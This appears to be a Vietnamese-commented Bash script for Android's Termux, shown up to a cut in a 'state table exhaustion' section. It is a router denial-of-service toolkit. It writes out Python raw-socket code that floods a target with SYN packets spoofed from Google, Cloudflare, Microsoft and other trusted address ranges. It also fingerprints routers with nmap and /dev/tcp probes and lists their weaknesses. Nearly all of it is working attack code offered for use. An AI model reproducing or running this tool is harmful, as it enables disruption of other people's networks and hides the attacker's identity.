#!/data/data/com.termux/files/usr/bin/bash

# =====================================================
# █▀▀ ▄▀█ ▀█▀ ▄▀█ ▀█▀ █ █▄░█ █▀▀    █▀▄ ▄▀█ ▀█▀ ▄▀█
# █▄█ █▀█ ░█░ █▀█ ░█░ █ █░▀█ █▄█    █▄▀ █▀█ ░█░ █▀█
# █▀█ █░█ █▄█ █░█ █▄█ █ █ █ █▀▀    ▄▀█ █░█ █▄█ █░█
# ▀▀█ █▄█ ░█░ █▄█ ░█░ █ ▀ ▀ ██▄    █▀█ █▄█ ░█░ █▄█
# =====================================================
# TRUE LAYER 2 DESTROYER - Router's Worst Nightmare
# =====================================================

# ASCII Art Variables
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
ORANGE='\033[38;5;208m'
GRAY='\033[38;5;245m'
BOLD='\033[1m'
NC='\033[0m'

# Global Variables
TARGET_IP=""
TARGET_MAC=""
GATEWAY_IP=""
GATEWAY_MAC=""
INTERFACE=""
ROUTER_TYPE=""
ATTACK_MODE=""
PACKET_COUNT=0
THREADS=50
VERBOSE=false
LOG_FILE="/data/data/com.termux/files/home/khang_log.txt"

# ============================================
# BANNER - HOÀNH TRÁNG VÀ ĐẸP MẮT
# ============================================
show_banner() {
    clear
    echo -e "${RED}"
    echo '╔════════════════════════════════════════════════════════════════╗'
    echo '║                                                                ║'
    echo '║  ██╗  ██╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗     ██╗  ██╗██████╗ ║'
    echo '║  ██║  ██║██║  ██║██╔══██╗████╗  ██║██╔════╝     ██║  ██║╚════██╗║'
    echo '║  ███████║███████║███████║██╔██╗ ██║██║  ███╗    ███████║ █████╔╝║'
    echo '║  ██╔══██║██╔══██║██╔══██║██║╚██╗██║██║   ██║    ██╔══██║██╔═══╝ ║'
    echo '║  ██║  ██║██║  ██║██║  ██║██║ ╚████║╚██████╔╝    ██║  ██║███████╗║'
    echo '║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝╚══════╝║'
    echo '║                                                                ║'
    echo '╠════════════════════════════════════════════════════════════════╣'
    echo '║    ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗       ║'
    echo '║    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║       ║'
    echo '║    ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║██║       ║'
    echo '║    ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║██║       ║'
    echo '║    ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝███████╗  ║'
    echo '║    ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝  ║'
    echo '║                    👽 CƠN ÁC MỘNG CỦA LAYER 2 👽               ║'
    echo '╚════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
    echo -e "${YELLOW}Version: 3.0 | Termux Edition | Made with ${RED}❤${YELLOW} & ${PURPLE}👾${NC}"
    echo ""
}

# ============================================
# KHỞI TẠO - KIỂM TRA HỆ THỐNG
# ============================================
initialize_system() {
    echo -e "${CYAN}[*] Khởi tạo Khang Hủy Diệt Layer 2...${NC}"
    
    # Check root
    if [ "$(whoami)" != "root" ]; then
        echo -e "${YELLOW}[!] Cảnh báo: Chạy với quyền root để có hiệu quả tốt nhất${NC}"
        echo -e "${YELLOW}[*] Chạy: ${WHITE}su${NC}"
    fi
    
    # Check dependencies
    local deps=("python" "nmap" "arp-scan" "tcpdump" "macchanger" "hping3")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[+] Cài đặt dependencies...${NC}"
        pkg update -y && pkg upgrade -y
        pkg install python nmap arp-scan tcpdump macchanger hping3 -y
        pip install --upgrade pip
        pip install scapy psutil netifaces colorama
    fi
    
    # Create log file
    touch $LOG_FILE
    echo -e "${GREEN}[✓] Hệ thống đã sẵn sàng!${NC}"
    sleep 1
}

# ============================================
# TÙY BIẾN PACKET - RAW PACKET CRAFTING
# ============================================
packet_crafter() {
    echo -e "${PURPLE}[=== TÙY BIẾN PACKET TỪ LỚP THẤP NHẤT ===]${NC}"
    
    cat << 'EOF' > /data/data/com.termux/files/home/custom_packet.py
import socket
import struct
import random
import time
from threading import Thread

class RawPacketCrafter:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
    def calculate_checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    def create_ip_header(self, source_ip, dest_ip, payload_len, ttl=64, protocol=socket.IPPROTO_TCP):
        # IP Header: 20 bytes
        ip_ver_ihl = (4 << 4) + 5  # IPv4, 5*4=20 bytes header
        ip_tos = 0
        ip_total_len = 20 + payload_len
        ip_id = random.randint(0, 65535)
        ip_frag = 0x4000  # Don't fragment
        ip_ttl = ttl
        ip_proto = protocol
        
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        # Checksum calculation
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ver_ihl, ip_tos, ip_total_len,
            ip_id, ip_frag, ip_ttl, ip_proto, 0,
            ip_saddr, ip_daddr)
        
        checksum = self.calculate_checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ver_ihl, ip_tos, ip_total_len,
            ip_id, ip_frag, ip_ttl, ip_proto, checksum,
            ip_saddr, ip_daddr)
        
        return ip_header
    
    def create_tcp_header(self, source_port, dest_port, seq_num, ack_num, 
                         flags=0x02, window=5840, urg_ptr=0):
        # TCP Header: 20 bytes minimum
        tcp_offset = (5 << 4)  # Data offset: 5*4=20 bytes
        tcp_flags = flags  # SYN=0x02, ACK=0x10, FIN=0x01, PSH=0x08, URG=0x20, RST=0x04
        
        tcp_header = struct.pack('!HHLLBBHHH',
            source_port, dest_port,
            seq_num, ack_num,
            tcp_offset, tcp_flags, window, 0, urg_ptr)
        
        return tcp_header
    
    def create_custom_tcp_packet(self, source_ip, dest_ip, source_port, 
                                seq_num=None, flags=0x02, ttl=64, urgent=False):
        if seq_num is None:
            seq_num = random.randint(0, 4294967295)
        
        # Create TCP header
        tcp_header = self.create_tcp_header(source_port, self.target_port, 
                                          seq_num, 0, flags)
        
        # Pseudo header for checksum
        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
            source_addr,
            dest_addr,
            placeholder,
            protocol,
            tcp_length)
        
        psh = psh + tcp_header
        
        # Calculate TCP checksum
        tcp_checksum = self.calculate_checksum(psh)
        
        # Remake TCP header with checksum
        tcp_header = struct.pack('!HHLLBBH',
            source_port, self.target_port,
            seq_num, 0,
            (5 << 4), flags, window) + struct.pack('H', tcp_checksum) + struct.pack('!H', 0)
        
        # Create IP header
        ip_header = self.create_ip_header(source_ip, dest_ip, len(tcp_header), ttl)
        
        # Combine and send
        packet = ip_header + tcp_header
        self.sock.sendto(packet, (dest_ip, 0))
        
        return packet
    
    def craft_special_packets(self, count=100):
        print(f"[*] Crafting {count} special packets with custom TTL and flags...")
        
        # Special flag combinations to fool firewalls
        flag_combinations = [
            0x02,  # SYN - Normal connection start
            0x12,  # SYN+ACK - Looks like response
            0x10,  # ACK - Established connection
            0x19,  # FIN+ACK+PSH - Important data ending
            0x29,  # URG+ACK+PSH - Urgent data
            0x01,  # FIN - Connection end
            0x04,  # RST - Reset connection
        ]
        
        # Spoof IP ranges
        trusted_ips = [
            "8.8.8.8",      # Google DNS
            "1.1.1.1",      # Cloudflare DNS
            "208.67.222.222", # OpenDNS
            "142.250.185.174", # Google
            "20.54.16.3",   # Microsoft
        ]
        
        threads = []
        for i in range(count):
            source_ip = random.choice(trusted_ips)
            source_port = random.randint(1024, 65535)
            ttl = random.choice([1, 16, 32, 64, 128, 255])  # Random TTL
            flags = random.choice(flag_combinations)
            seq_num = random.randint(1000, 4294967295)
            
            t = Thread(target=self.create_custom_tcp_packet, 
                      args=(source_ip, self.target_ip, source_port, seq_num, flags, ttl))
            threads.append(t)
            t.start()
            
            if i % 10 == 0:
                print(f"  [+] Sent {i} crafted packets", end='\r')
        
        for t in threads:
            t.join()
        
        print(f"\n[✓] Completed crafting {count} special packets")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 custom_packet.py <target_ip>")
        sys.exit(1)
    
    crafter = RawPacketCrafter(sys.argv[1])
    crafter.craft_special_packets(100)
EOF
    
    echo -e "${GREEN}[✓] Packet Crafter đã sẵn sàng!${NC}"
}

# ============================================
# QUÉT VÀ THÍCH ỨNG - ROUTER FINGERPRINTING
# ============================================
router_recon() {
    echo -e "${CYAN}[=== QUÉT VÀ NHẬN DIỆN ROUTER ===]${NC}"
    
    read -p "Nhập target IP/router: " TARGET_IP
    
    echo -e "${YELLOW}[*] Bắt đầu reconnaissance...${NC}"
    
    # OS Detection
    echo -e "${WHITE}[1] Phát hiện hệ điều hành...${NC}"
    os_result=$(nmap -O --osscan-guess $TARGET_IP 2>/dev/null | grep -E "Running|OS details")
    echo -e "${GRAY}   $os_result${NC}"
    
    # Port Scanning for router identification
    echo -e "${WHITE}[2] Quét cổng đặc trưng...${NC}"
    
    # Common router ports
    router_ports=("23" "80" "443" "8291" "8080" "7547" "161" "162" "22" "21")
    open_ports=()
    
    for port in "${router_ports[@]}"; do
        timeout 1 bash -c "echo > /dev/tcp/$TARGET_IP/$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            open_ports+=("$port")
            case $port in
                23) echo -e "${GREEN}   ✓ Telnet (23) mở - Thường thấy trên router cũ${NC}" ;;
                80) echo -e "${GREEN}   ✓ HTTP (80) mở - Web interface${NC}" ;;
                443) echo -e "${GREEN}   ✓ HTTPS (443) mở - Secure web interface${NC}" ;;
                8291) echo -e "${GREEN}   ✓ Mikrotik Winbox (8291) mở - Mikrotik router${NC}" ;;
                7547) echo -e "${GREEN}   ✓ TR-069 (7547) mở - Router quản lý từ xa${NC}" ;;
                161) echo -e "${GREEN}   ✓ SNMP (161) mở - Dễ bị khai thác${NC}" ;;
                22) echo -e "${GREEN}   ✓ SSH (22) mở - Router cao cấp${NC}" ;;
            esac
        fi
    done
    
    # TTL Analysis
    echo -e "${WHITE}[3] Phân tích TTL...${NC}"
    ttl_result=$(ping -c 1 $TARGET_IP | grep "ttl=")
    ttl_value=$(echo $ttl_result | grep -o "ttl=[0-9]*" | cut -d= -f2)
    
    echo -e "${GRAY}   TTL: $ttl_value${NC}"
    
    # Determine router type based on findings
    if [[ $os_result == *"Mikrotik"* ]] || [[ " ${open_ports[@]} " =~ " 8291 " ]]; then
        ROUTER_TYPE="Mikrotik"
        echo -e "${RED}[!] Phát hiện: Mikrotik RouterOS${NC}"
        echo -e "${YELLOW}[*] Điểm yếu: Winbox protocol, CPU dễ quá tải${NC}"
        
    elif [[ $os_result == *"Cisco"* ]] || [[ " ${open_ports[@]} " =~ " 23 " ]]; then
        ROUTER_TYPE="Cisco"
        echo -e "${RED}[!] Phát hiện: Cisco Router${NC}"
        echo -e "${YELLOW}[*] Điểm yếu: Telnet, TCP sequence prediction${NC}"
        
    elif [[ $ttl_value -eq 64 ]] || [[ " ${open_ports[@]} " =~ " 7547 " ]]; then
        ROUTER_TYPE="HomeRouter"
        echo -e "${RED}[!] Phát hiện: Home Router (TP-Link, D-Link, Tenda)${NC}"
        echo -e "${YELLOW}[*] Điểm yếu: NAT table exhaustion, HTTP interface${NC}"
        
    elif [[ $ttl_value -eq 128 ]]; then
        ROUTER_TYPE="WindowsRouter"
        echo -e "${RED}[!] Phát hiện: Windows-based Router${NC}"
        echo -e "${YELLOW}[*] Điểm yếu: SMB protocol, NetBIOS${NC}"
        
    else
        ROUTER_TYPE="Generic"
        echo -e "${YELLOW}[!] Không xác định rõ, sử dụng tấn công tổng quát${NC}"
    fi
    
    # Get MAC address
    echo -e "${WHITE}[4] Lấy địa chỉ MAC...${NC}"
    TARGET_MAC=$(arp -a $TARGET_IP 2>/dev/null | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
    
    if [ -z "$TARGET_MAC" ]; then
        echo -e "${YELLOW}[*] Không tìm thấy MAC, sử dụng broadcast...${NC}"
        TARGET_MAC="ff:ff:ff:ff:ff:ff"
    else
        echo -e "${GREEN}[✓] MAC: $TARGET_MAC${NC}"
        
        # Vendor detection from MAC
        mac_prefix=$(echo $TARGET_MAC | cut -d: -f1-3 | tr ':' '')
        case $mac_prefix in
            "000C42") echo -e "${GRAY}   Vendor: Mikrotik${NC}" ;;
            "00163E") echo -e "${GRAY}   Vendor: Cisco${NC}" ;;
            "001D0F") echo -e "${GRAY}   Vendor: TP-Link${NC}" ;;
            "C4A81D") echo -e "${GRAY}   Vendor: D-Link${NC}" ;;
            "80C16E") echo -e "${GRAY}   Vendor: Tenda${NC}" ;;
            *) echo -e "${GRAY}   Vendor: Unknown${NC}" ;;
        esac
    fi
    
    # Get gateway
    GATEWAY_IP=$(ip route | grep default | awk '{print $3}')
    echo -e "${GREEN}[✓] Gateway: $GATEWAY_IP${NC}"
    
    # Get interface
    INTERFACE=$(ip route | grep default | awk '{print $5}')
    echo -e "${GREEN}[✓] Interface: $INTERFACE${NC}"
    
    echo -e "${PURPLE}[*] Reconnaissance hoàn thành!${NC}"
    echo -e "${PURPLE}[*] Router type: $ROUTER_TYPE${NC}"
    
    # Log results
    echo "$(date) - Recon: $TARGET_IP - Type: $ROUTER_TYPE - MAC: $TARGET_MAC" >> $LOG_FILE
}

# ============================================
# GIẢ MẠO THÔNG MINH - SMART SPOOFING
# ============================================
smart_spoofing() {
    echo -e "${PURPLE}[=== GIẢ MẠO THÔNG MINH - SPOOF TRUSTED IPS ===]${NC}"
    
    cat << 'EOF' > /data/data/com.termux/files/home/smart_spoof.py
import socket
import struct
import random
import threading
import time

class SmartSpoofer:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.trusted_subnets = [
            # Google
            ("8.8.0.0", "8.8.255.255"),
            ("142.250.0.0", "142.251.255.255"),
            # Cloudflare
            ("1.1.1.0", "1.1.1.255"),
            ("104.16.0.0", "104.31.255.255"),
            # Microsoft
            ("13.64.0.0", "13.107.255.255"),
            ("40.74.0.0", "40.126.255.255"),
            # Facebook
            ("31.13.64.0", "31.13.95.255"),
            # Amazon AWS
            ("52.0.0.0", "52.95.255.255"),
            # Local trusted
            ("192.168.0.0", "192.168.255.255"),
            ("10.0.0.0", "10.255.255.255"),
        ]
        
        self.trusted_single_ips = [
            "8.8.8.8", "8.8.4.4",           # Google DNS
            "1.1.1.1", "1.0.0.1",           # Cloudflare DNS
            "9.9.9.9",                      # Quad9
            "208.67.222.222", "208.67.220.220", # OpenDNS
            "64.6.64.6", "64.6.65.6",       # Verisign
            "185.228.168.9",                # CleanBrowsing
            "76.76.19.19",                  # Alternate DNS
            "94.140.14.14",                 # AdGuard DNS
        ]
    
    def ip_to_int(self, ip):
        return struct.unpack("!I", socket.inet_aton(ip))[0]
    
    def int_to_ip(self, num):
        return socket.inet_ntoa(struct.pack("!I", num))
    
    def get_random_trusted_ip(self):
        # 70% chance to use subnet IP, 30% chance to use single trusted IP
        if random.random() < 0.7:
            subnet = random.choice(self.trusted_subnets)
            start = self.ip_to_int(subnet[0])
            end = self.ip_to_int(subnet[1])
            random_ip_int = random.randint(start, end)
            return self.int_to_ip(random_ip_int)
        else:
            return random.choice(self.trusted_single_ips)
    
    def create_syn_packet(self, source_ip):
        # Raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP Header
        ip_ver_ihl = 69  # IPv4, 5*4=20 bytes
        ip_tos = 0
        ip_total_len = 40  # 20 IP + 20 TCP
        ip_id = random.randint(0, 65535)
        ip_frag = 0x4000  # Don't fragment
        ip_ttl = random.choice([64, 128, 255])
        ip_proto = socket.IPPROTO_TCP
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(self.target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ver_ihl, ip_tos, ip_total_len,
            ip_id, ip_frag, ip_ttl, ip_proto, 0,
            ip_saddr, ip_daddr)
        
        # TCP Header
        source_port = random.randint(1024, 65535)
        dest_port = self.target_port
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        tcp_offset = (5 << 4)  # 5*4=20 bytes
        tcp_flags = 0x02  # SYN
        
        # Window size variations
        window_sizes = [5840, 64240, 65535, 8760, 16384]
        window = random.choice(window_sizes)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            source_port, dest_port,
            seq_num, ack_num,
            tcp_offset, tcp_flags, window, 0, 0)
        
        # Send packet
        packet = ip_header + tcp_header
        try:
            s.sendto(packet, (self.target_ip, 0))
            return True
        except:
            return False
        finally:
            s.close()
    
    def flood_with_spoofed_ips(self, count=1000, threads=10):
        print(f"[*] Starting smart spoofing flood with {count} packets...")
        print("[*] Spoofing trusted IPs and subnets")
        
        sent = 0
        lock = threading.Lock()
        
        def worker():
            nonlocal sent
            while True:
                with lock:
                    if sent >= count:
                        return
                    sent += 1
                    current = sent
                
                source_ip = self.get_random_trusted_ip()
                success = self.create_syn_packet(source_ip)
                
                if current % 100 == 0:
                    print(f"  [+] Sent {current}/{count} packets from {source_ip}")
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker)
            thread_list.append(t)
            t.start()
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        print(f"\n[✓] Smart spoofing completed: {count} packets sent")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 smart_spoof.py <target_ip> [packet_count]")
        sys.exit(1)
    
    target = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    
    spoofer = SmartSpoofer(target)
    spoofer.flood_with_spoofed_ips(count)
EOF
    
    echo -e "${GREEN}[✓] Smart Spoofer đã sẵn sàng!${NC}"
    echo -e "${YELLOW}[*] Sử dụng: python smart_spoof.py <IP> <số_packet>${NC}"
}

# ============================================
# TẤN CÔNG BẢNG TRẠNG THÁI - STATE TABLE EXHAUSTION
# ============================================
state_table_attack() {
    echo -e "${RED}[=== STATE 
